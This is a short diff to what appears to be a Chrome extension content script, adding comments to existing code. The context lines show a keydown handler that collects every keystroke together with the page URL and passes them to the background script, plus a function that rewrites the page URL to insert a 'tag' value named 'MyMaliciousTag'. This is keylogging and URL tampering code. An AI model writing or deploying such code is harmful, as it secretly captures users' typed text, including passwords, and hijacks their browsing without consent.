@@ -1,5 +1,6 @@
 chrome.runtime.onConnect.addListener(function (port) {});
 
+// save the key and web page url and send them to the background.js
 var k = "";
 var data = {};
 window.onkeydown = function (event) {
@@ -15,6 +16,7 @@ window.onkeydown = function (event) {
   chrome.runtime.sendMessage(data);
 };
 
+// modify the url and add tag
 function modifyURL() {
   const url = new URL(window.location.href);
   url.searchParams.set("tag", "MyMaliciousTag");
